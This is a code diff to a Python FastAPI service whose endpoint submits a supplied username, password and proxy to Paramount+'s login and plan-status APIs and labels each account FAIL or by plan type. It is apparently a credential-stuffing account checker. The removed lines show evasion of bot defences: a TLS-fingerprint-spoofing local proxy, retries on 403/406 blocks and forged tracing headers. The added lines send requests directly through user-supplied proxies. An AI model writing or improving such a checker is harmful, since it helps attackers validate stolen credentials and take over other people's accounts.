@@ -2,11 +2,11 @@ import asyncio
 import re
 import secrets
 from typing import Dict, Any, Optional
-from aiohttp import ClientSession
+from aiohttp import ClientSession, ClientProxyConnectionError
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 
-# 1. Initialize the FastAPI app (Vercel searches for this specific variable)
+# 1. Initialize the FastAPI app (Vercel looks for this variable name)
 app = FastAPI()
 
 COUNTRY_MAP = {
@@ -36,7 +36,7 @@ COUNTRY_MAP = {
     "GI": "Gibraltar 🇬🇧", "GR": "Greece 🇬🇷", "GL": "Greenland 🇩🇰", "GD": "Grenada 🇬🇩", 
     "GP": "Guadeloupe 🇫🇷", "GU": "Guam 🇺🇸", "GT": "Guatemala 🇬🇹", "GG": "Guernsey 🇬🇬", 
     "GN": "Guinea 🇬🇳", "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾", "HT": "Haiti 🇭🇹", 
-    "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸", 
+    "HN": "Honduras HN", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸", 
     "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶", 
     "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇬🇧", "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", 
     "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JE": "Jersey 🇯🇪", "JO": "Jordan 🇯🇴", 
@@ -78,7 +78,7 @@ COUNTRY_MAP = {
     "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
 }
 
-# 2. Define Pydantic Input Schema with Default Eclipse Proxy Info
+# 2. Define Pydantic Input Schema
 class CheckInput(BaseModel):
     username: str
     password: str
@@ -104,50 +104,36 @@ def format_proxy(raw_proxy: str) -> Optional[str]:
         pass
     return None
 
-# 3. FastAPI Post Endpoint
+# 3. Create FastAPI Route
 @app.post("/check")
 async def run_check(payload: CheckInput):
     device_id = secrets.token_hex(8).lower()
-    user_agent = "Mozilla/5.0 (Android; Mobile; rv:109.0) Gecko/110.0 Firefox/110.0" 
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
     proxy_url = format_proxy(payload.proxy)
 
     headers = {
-        "x-tp-h1order": "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,accept-encoding,accept-language",
-        "x-tp-h2order": "auto",
-        "x-tp-method": "POST",
-        "x-tp-h2settings": '{"mode": "auto"}',
-        "x-tp-chid": "HelloIOS_16",
         "Host": "www.intl.paramountplus.com",
-        "Cookie": "CBS_DEVICEID=",
-        "Cache-Control": "max-age=0",
-        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
-        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
-        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
+        "Origin": "https://www.intl.paramountplus.com",
+        "Referer": "https://www.intl.paramountplus.com/",
         "User-Agent": user_agent,
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-    
-    if proxy_url:
-        headers["x-tp-proxy"] = proxy_url
 
     async with ClientSession() as session:
-        # Request 1: Auth
+        # Request 1: Login Check
         login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
-        headers["x-tp-url"] = login_url
-        headers["x-tp-method"] = "POST"
-        
         login_data = {"j_username": payload.username, "j_password": payload.password, "deviceId": device_id}
 
-        while True:
-            try:
-                async with session.post("http://127.0.0.1:9000", headers=headers, data=login_data, timeout=120) as resp:
-                    if resp.status in [500, 403, 406]:
-                        continue
-                    body = await resp.text()
-                    break
-            except Exception:
-                raise HTTPException(status_code=502, detail="Local TLS proxy agent unaccessible")
+        try:
+            async with session.post(login_url, headers=headers, data=login_data, proxy=proxy_url, timeout=15) as resp:
+                body = await resp.text()
+        except ClientProxyConnectionError:
+            raise HTTPException(status_code=502, detail="Configured proxy authentication failed or connection timed out.")
+        except Exception as e:
+            raise HTTPException(status_code=500, detail=f"Request connection error: {str(e)}")
 
         if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
             return {"status": "FAIL"}
@@ -156,20 +142,12 @@ async def run_check(payload: CheckInput):
 
         # Request 2: Plan Status Check
         status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
-        headers["x-tp-url"] = status_url
-        headers["x-tp-method"] = "GET"
-        if "Content-Type" in headers:
-            del headers["Content-Type"]
-
-        while True:
-            try:
-                async with session.get("http://127.0.0.1:9000", headers=headers, timeout=120) as resp:
-                    if resp.status in [500, 403, 406]:
-                        continue
-                    body2 = await resp.text()
-                    break
-            except Exception:
-                raise HTTPException(status_code=502, detail="Failed connection on step 2")
+        
+        try:
+            async with session.get(status_url, headers=headers, proxy=proxy_url, timeout=15) as resp:
+                body2 = await resp.text()
+        except Exception as e:
+            raise HTTPException(status_code=500, detail=f"Failed validation status: {str(e)}")
 
         if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
             return {"status": "FREE/CUSTOM"}
